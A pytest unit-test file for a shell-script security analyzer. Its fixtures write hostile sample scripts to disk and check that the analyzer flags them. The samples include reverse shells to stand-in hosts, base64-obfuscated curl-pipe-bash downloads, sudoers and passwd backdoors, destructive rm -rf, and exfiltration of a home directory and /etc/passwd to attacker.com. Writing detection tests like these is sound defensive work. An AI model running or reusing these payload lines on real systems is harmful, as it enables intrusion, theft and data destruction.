"""Unit tests for the ShellScriptAnalyzer."""

import os
import shutil
from pathlib import Path
from typing import Any, Dict
from unittest.mock import patch

import pytest

from insect.analysis.shell.analyzer import ShellScriptAnalyzer


@pytest.fixture
def test_config() -> Dict[str, Any]:
    """Return a configuration for testing the analyzer."""
    return {
        "shell_script_analyzer": {
            "enabled": True,
            "min_confidence": 0.0,
            "use_shellcheck": False,  # Disable for testing
        }
    }


@pytest.fixture
def analyzer(test_config: Dict[str, Any]) -> ShellScriptAnalyzer:
    """Initialize the analyzer with the test configuration."""
    with patch(
        "insect.analysis.static_analyzer_utils.check_tool_availability",
        return_value=(
            False,
            "ShellCheck not available for testing",
        ),  # Make sure shellcheck is considered not available
    ):
        return ShellScriptAnalyzer(test_config)


@pytest.fixture
def test_files_dir() -> Path:
    """Get the directory containing test files."""
    current_dir = Path(os.path.dirname(os.path.abspath(__file__)))
    test_files_dir = current_dir / "test_files"
    test_files_dir.mkdir(exist_ok=True)
    return test_files_dir


def create_test_file(test_files_dir: Path, filename: str, content: str) -> Path:
    """Create a test file with the given content.

    Args:
        test_files_dir: Directory to create the file in
        filename: Name of the file to create
        content: Content to write to the file

    Returns:
        Path to the created file
    """
    file_path = test_files_dir / filename
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(content)
    return file_path


def test_analyzer_initialization(analyzer: ShellScriptAnalyzer) -> None:
    """Test that the analyzer is properly initialized."""
    assert analyzer.name == "shell_script_analyzer"
    assert analyzer.enabled is True
    assert analyzer.min_confidence == 0.0
    assert analyzer.use_shellcheck is False
    assert len(analyzer.rules) > 0
    assert ".sh" in analyzer.supported_extensions
    assert ".bash" in analyzer.supported_extensions


def test_reverse_shell_detection(
    analyzer: ShellScriptAnalyzer, test_files_dir: Path
) -> None:
    """Test detection of reverse shells and backdoors."""
    file_path = create_test_file(
        test_files_dir,
        "test_reverse_shell.sh",
        """
        #!/bin/bash

        # Basic reverse shell using netcat
        nc -e /bin/bash 10.0.0.1 4444

        # Using /dev/tcp for a reverse shell
        bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

        # Python reverse shell
        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
        """,
    )

    findings = analyzer.analyze_file(file_path)

    assert len(findings) >= 2
    assert any(
        "reverse shell" in finding.title.lower() or "backdoor" in finding.title.lower()
        for finding in findings
    )

    # Clean up
    os.remove(file_path)


def test_obfuscated_command_detection(
    analyzer: ShellScriptAnalyzer, test_files_dir: Path
) -> None:
    """Test detection of obfuscated commands."""
    file_path = create_test_file(
        test_files_dir,
        "test_obfuscated.sh",
        """
        #!/bin/bash

        # Base64 encoded command
        echo "ZWNobyAiaGFja2VkIg==" | base64 -d | bash

        # Another obfuscation technique
        eval $(echo "Y3VybCAtcyBodHRwOi8vbWFsaWNpb3VzLmNvbS9wYXlsb2FkLnNoIHwgYmFzaA==" | base64 -d)

        # Hex encoded command
        xxd -r -p <<< "726d202d7266202f686f6d652f75736572" | bash
        """,
    )

    findings = analyzer.analyze_file(file_path)

    assert len(findings) >= 3
    assert any(
        "obfuscated" in finding.title.lower() or "encoded" in finding.title.lower()
        for finding in findings
    )

    # Clean up
    os.remove(file_path)


def test_dangerous_command_execution(
    analyzer: ShellScriptAnalyzer, test_files_dir: Path
) -> None:
    """Test detection of dangerous command execution."""
    file_path = create_test_file(
        test_files_dir,
        "test_dangerous_commands.sh",
        """
        #!/bin/bash

        # Downloading and executing from the web
        curl -s https://example.com/script.sh | bash

        # Using eval with variables
        eval "$USER_INPUT"

        # Sourcing from a curl command
        source <(curl -s https://example.com/script.sh)

        # Executing downloaded file
        wget -q https://example.com/payload.sh -O /tmp/script.sh && bash /tmp/script.sh
        """,
    )

    findings = analyzer.analyze_file(file_path)

    assert len(findings) >= 4
    assert any(
        "dangerous" in finding.title.lower()
        or "command execution" in finding.description.lower()
        for finding in findings
    )

    # Clean up
    os.remove(file_path)


def test_suspicious_network_activity(
    analyzer: ShellScriptAnalyzer, test_files_dir: Path
) -> None:
    """Test detection of suspicious network activity."""
    file_path = create_test_file(
        test_files_dir,
        "test_network.sh",
        """
        #!/bin/bash

        # Downloading files to temp locations
        wget https://example.com/payload -O /tmp/payload

        # Port scanning
        nc -z 192.168.1.1 22

        # DNS lookups
        nslookup suspicious-domain.com

        # Direct TCP connection
        exec 3<>/dev/tcp/example.com/80

        # More suspicious network activity
        curl -s https://sketchy-domain.com/script | bash
        """,
    )

    findings = analyzer.analyze_file(file_path)

    assert len(findings) >= 2
    assert any(
        "network" in finding.title.lower()
        or "connection" in finding.description.lower()
        for finding in findings
    )

    # Clean up
    os.remove(file_path)


def test_privilege_escalation_detection(
    analyzer: ShellScriptAnalyzer, test_files_dir: Path
) -> None:
    """Test detection of privilege escalation attempts."""
    file_path = create_test_file(
        test_files_dir,
        "test_privesc.sh",
        """
        #!/bin/bash

        # Setting SUID bit
        chmod +s /usr/bin/custom_binary

        # Modifying sudoers file
        echo "user ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers

        # Adding user to sudo group
        usermod -G sudo username

        # Creating a privileged cronjob
        echo "* * * * * root /path/to/script" > /etc/cron.d/backdoor
        """,
    )

    findings = analyzer.analyze_file(file_path)

    assert len(findings) >= 4
    assert any(
        "privilege" in finding.title.lower()
        or "escalation" in finding.description.lower()
        for finding in findings
    )

    # Clean up
    os.remove(file_path)


def test_sensitive_file_operations(
    analyzer: ShellScriptAnalyzer, test_files_dir: Path
) -> None:
    """Test detection of sensitive file operations."""
    file_path = create_test_file(
        test_files_dir,
        "test_file_ops.sh",
        """
        #!/bin/bash

        # Removing system files
        rm -rf /etc/ssh/

        # Modifying hosts file
        echo "127.0.0.1 legitimate-site.com" >> /etc/hosts

        # Creating directories in sensitive locations
        mkdir -p /etc/backdoor/

        # Modifying passwd file
        echo "newuser:x:0:0::/:/bin/bash" >> /etc/passwd
        """,
    )

    findings = analyzer.analyze_file(file_path)

    assert len(findings) >= 4
    assert any(
        "sensitive file" in finding.title.lower()
        or "file operation" in finding.title.lower()
        for finding in findings
    )

    # Clean up
    os.remove(file_path)


def test_environment_variable_manipulation(
    analyzer: ShellScriptAnalyzer, test_files_dir: Path
) -> None:
    """Test detection of environment variable manipulation."""
    file_path = create_test_file(
        test_files_dir,
        "test_env_vars.sh",
        """
        #!/bin/bash

        # Modifying PATH
        export PATH=/tmp:$PATH

        # Setting LD_PRELOAD
        export LD_PRELOAD=/path/to/malicious.so

        # Unsetting IFS
        unset IFS

        # Changing user identity
        export HOME=/root
        export USER=root
        """,
    )

    findings = analyzer.analyze_file(file_path)

    assert len(findings) >= 4
    assert any(
        "environment variable" in finding.title.lower()
        or "manipulation" in finding.title.lower()
        for finding in findings
    )

    # Clean up
    os.remove(file_path)


def test_data_exfiltration_detection(
    analyzer: ShellScriptAnalyzer, test_files_dir: Path
) -> None:
    """Test detection of potential data exfiltration."""
    file_path = create_test_file(
        test_files_dir,
        "test_exfil.sh",
        """
        #!/bin/bash

        # Archiving home directory
        tar -cz /home/user | curl -X POST -d @- https://example.com/exfil

        # Finding sensitive files
        find / -name "*.key" -o -name "*.pem" > /tmp/sensitive_files.txt

        # Encrypting data
        gpg --encrypt --recipient attacker@example.com sensitive_data.txt

        # Sending data with netcat
        cat /etc/passwd | nc attacker.com 8888
        """,
    )

    findings = analyzer.analyze_file(file_path)

    assert len(findings) >= 4
    assert any(
        "exfiltration" in finding.title.lower() or "data" in finding.description.lower()
        for finding in findings
    )

    # Clean up
    os.remove(file_path)


def test_analyze_file_not_exists(analyzer: ShellScriptAnalyzer) -> None:
    """Test analyzing a file that doesn't exist."""
    findings = analyzer.analyze_file(Path("nonexistent_file.sh"))
    assert len(findings) == 0


def test_analyze_empty_file(
    analyzer: ShellScriptAnalyzer, test_files_dir: Path
) -> None:
    """Test analyzing an empty file."""
    file_path = create_test_file(
        test_files_dir,
        "test_empty.sh",
        "",
    )

    findings = analyzer.analyze_file(file_path)

    assert len(findings) == 0

    # Clean up
    os.remove(file_path)


def test_shellcheck_integration(
    test_config: Dict[str, Any], test_files_dir: Path
) -> None:
    """Test integration with ShellCheck."""
    # Only run this test if shellcheck is available
    shellcheck_available = os.system("which shellcheck > /dev/null 2>&1") == 0
    if not shellcheck_available:
        pytest.skip("ShellCheck not available")

    # Create a file with shellcheck issues
    file_path = create_test_file(
        test_files_dir,
        "test_shellcheck.sh",
        """
        #!/bin/bash

        # SC2086: Double quote to prevent globbing and word splitting
        echo $PATH

        # SC2154: var is referenced but not assigned
        echo $var

        # SC2016: Expressions don't expand in single quotes
        echo 'Using $HOME'
        """,
    )

    # Configure analyzer to use shellcheck
    test_config["shell_script_analyzer"]["use_shellcheck"] = True
    analyzer = ShellScriptAnalyzer(test_config)

    findings = analyzer.analyze_file(file_path)

    # If shellcheck is truly available, we should get findings
    # If not, the analyzer will correctly return empty results
    if analyzer.use_shellcheck and shutil.which("shellcheck"):
        assert len(findings) > 0
        assert any("shellcheck" in finding.id.lower() for finding in findings)
    else:
        # If shellcheck is not available, that's also valid behavior
        pytest.skip("ShellCheck not actually available despite initial check")

    # Clean up
    os.remove(file_path)


def test_confidence_threshold(
    test_config: Dict[str, Any], test_files_dir: Path
) -> None:
    """Test that the confidence threshold works."""
    # This test is mainly focused on checking that the min_confidence parameter is properly applied

    # Create a file that will be analyzed
    file_path = create_test_file(
        test_files_dir,
        "test_confidence.sh",
        """
        #!/bin/bash

        # Clear reverse shell that should be detected
        nc -e /bin/bash attacker.com 4444
        """,
    )

    # Get analyzer with min_confidence = 0.0
    test_config["shell_script_analyzer"]["min_confidence"] = 0.0
    with patch(
        "insect.analysis.static_analyzer_utils.check_tool_availability",
        return_value=(False, "ShellCheck not available for testing"),
    ):
        analyzer = ShellScriptAnalyzer(test_config)

    # Check that min_confidence value is set correctly
    assert analyzer.min_confidence == 0.0

    # For a different high threshold, it should also be set correctly
    test_config["shell_script_analyzer"]["min_confidence"] = 0.9
    with patch(
        "insect.analysis.static_analyzer_utils.check_tool_availability",
        return_value=(False, "ShellCheck not available for testing"),
    ):
        high_analyzer = ShellScriptAnalyzer(test_config)

    assert high_analyzer.min_confidence == 0.9

    # Clean up
    os.remove(file_path)
